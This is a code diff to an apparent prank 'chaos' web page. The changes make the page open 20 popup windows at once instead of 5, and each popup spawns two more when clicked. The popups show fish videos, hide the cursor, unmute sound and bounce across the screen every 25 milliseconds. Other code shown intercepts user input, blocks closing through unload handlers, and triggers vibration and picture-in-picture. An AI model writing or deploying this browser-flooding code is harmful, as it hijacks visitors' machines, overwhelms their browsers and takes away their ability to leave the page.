@@ -262,14 +262,14 @@
         animateUrlWithEmojis();
 
         setInterval(() => {
-          if (wins.length < 35) {
+          if (activeWindows.length < 35) {
             openWindow();
           }
-        }, 1200);
+        }, 1500);
 
         interceptUserInput(handleChaosInput);
         handleChaosInput(event);
-        spawnWindows(5);
+        spawnWindows(20);
       }
 
       function handleChaosInput(event) {
@@ -280,7 +280,7 @@
           try { event.stopPropagation(); } catch (e) {}
         }
 
-        if (!event || event.which !== 0) spawnWindows(2);
+        if (!event || event.which !== 0) spawnWindows(3);
 
         startVibrateInterval();
         enablePictureInPicture();
@@ -529,16 +529,54 @@
       });
     }
 
-    function openWindow() {
-      const { x, y } = getRandomCoords();
-      const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
-      const childUrl = window.location.href.split('?')[0].split('#')[0] + '?child=true';
-      const win = window.open(childUrl, '', opts);
+    const activeWindows = [];
 
+    function openWindow() {
+      const w = 360;
+      const h = 220;
+      const screenW = window.screen.availWidth || 1920;
+      const screenH = window.screen.availHeight || 1080;
+      const maxX = Math.max(10, screenW - w - 20);
+      const maxY = Math.max(10, screenH - h - 50);
+      const startX = Math.floor(Math.random() * maxX);
+      const startY = Math.floor(Math.random() * maxY);
+
+      const opts = `width=${w},height=${h},left=${startX},top=${startY},menubar=no,toolbar=no,location=no,status=no`;
+      const win = window.open('', '', opts);
       if (!win) return;
+
       wins.push(win);
 
+      const file = getRandomArrayEntry(VIDEOS);
+      const isImg = /\.(gif|png|jpe?g|webp|svg)$/i.test(file);
+      const mediaHtml = isImg
+        ? `<img src="${file}" onerror="this.src='ryby/ryba.gif'" style="width:100vw;height:100vh;object-fit:cover;display:block;">`
+        : `<video src="${file}" onerror="this.outerHTML='<img src=\\\'ryby/ryba-kot.gif\\\' style=\\\'width:100vw;height:100vh;object-fit:cover;display:block;\\\'>'" autoplay loop muted playsinline style="width:100vw;height:100vh;object-fit:cover;display:block;"></video>`;
+
       try {
+        win.document.open();
+        win.document.write(`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>ryba</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; overflow:hidden; background:#000; cursor:none; }
+    html, body { width:100vw; height:100vh; overflow:hidden; }
+  </style>
+</head>
+<body>
+  ${mediaHtml}
+</body>
+</html>`);
+        win.document.close();
+
+        win.addEventListener('click', () => {
+          const v = win.document.querySelector('video');
+          if (v) { v.muted = false; v.volume = 1; v.play().catch(() => {}); }
+          spawnWindows(2);
+        });
+
         win.onunload = () => false;
         win.addEventListener("beforeunload", (e) => {
           e.preventDefault();
@@ -546,18 +584,70 @@
         });
         win.onbeforeunload = () => "";
       } catch (e) {}
+
+      const speedX = 6 + Math.floor(Math.random() * 8);
+      const speedY = 5 + Math.floor(Math.random() * 8);
+      const vx = (Math.random() > 0.5 ? 1 : -1) * speedX;
+      const vy = (Math.random() > 0.5 ? 1 : -1) * speedY;
+
+      activeWindows.push({
+        win: win,
+        x: startX,
+        y: startY,
+        vx: vx,
+        vy: vy,
+        w: w,
+        h: h
+      });
+
+      startMasterBounce();
     }
 
-    function spawnWindows(count = 1) {
-      for (let i = 0; i < count; i++) {
-        if (i === 0) {
-          openWindow();
-        } else {
-          setTimeout(() => {
-            openWindow();
-          }, i * 120);
+    let masterBounceInterval = null;
+    function startMasterBounce() {
+      if (masterBounceInterval) return;
+      masterBounceInterval = setInterval(() => {
+        const screenW = window.screen.availWidth || 1920;
+        const screenH = window.screen.availHeight || 1080;
+
+        for (let i = activeWindows.length - 1; i >= 0; i--) {
+          const item = activeWindows[i];
+          if (!item.win || item.win.closed) {
+            activeWindows.splice(i, 1);
+            continue;
+          }
+
+          item.x += item.vx;
+          item.y += item.vy;
+
+          if (item.x + item.w >= screenW - 15) {
+            item.x = screenW - item.w - 15;
+            item.vx = -Math.abs(item.vx);
+          } else if (item.x <= 5) {
+            item.x = 5;
+            item.vx = Math.abs(item.vx);
+          }
+
+          if (item.y + item.h >= screenH - 45) {
+            item.y = screenH - item.h - 45;
+            item.vy = -Math.abs(item.vy);
+          } else if (item.y <= 5) {
+            item.y = 5;
+            item.vy = Math.abs(item.vy);
+          }
+
+          try {
+            item.win.moveTo(Math.round(item.x), Math.round(item.y));
+          } catch (e) {}
         }
+      }, 25);
+    }
+
+    function spawnWindows(count = 20) {
+      for (let i = 0; i < count; i++) {
+        openWindow();
       }
+      startMasterBounce();
     }
 
     function hideCursor() {
